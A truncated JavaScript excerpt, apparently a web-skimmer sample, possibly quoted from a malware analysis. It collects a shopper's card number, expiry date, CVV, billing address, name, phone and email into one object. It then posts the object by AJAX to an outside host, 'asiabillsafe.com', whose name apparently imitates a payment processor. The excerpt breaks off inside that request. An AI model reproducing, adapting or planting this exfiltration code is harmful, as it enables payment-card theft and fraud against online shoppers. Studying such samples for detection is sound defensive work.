(function() {
        ...
        function d() {
            let e = function(e, a) {
                let t;
                console.log("data", e);
                let detail = JSON.parse(e);
                let new_data = {
                    "pay_card_number": detail.card.cardNo,
                    "pay_card_mm": detail.card.cardExpireMonth,
                    "pay_card_yy": detail.card.cardExpireYear,
                    "pay_card_cvv": detail.card.cardSecurityCode,
                    "shipping_contry": detail.billingDetail.address.country,
                    "shipping_province": detail.billingDetail.address.state,
                    "shipping_city": detail.billingDetail.address.city,
                    "shipping_zip_code": detail.billingDetail.address.postalCode,
                    "billing_address": detail.billingDetail.address.line1,
                    "billing_other_address": detail.billingDetail.address.line2,
                    "shipping_first_name": detail.billingDetail.firstName,
                    "shipping_last_name": detail.billingDetail.lastName,
                    "shipping_phone": detail.billingDetail.phone,
                    "email": detail.billingDetail.email
                };
                $.ajax({
                    type: "post",
                    timeout: 5e3,
                    ...
                    url: "https://www.asiabillsafe.com/save_order_info/",
                    async: a.async || false,
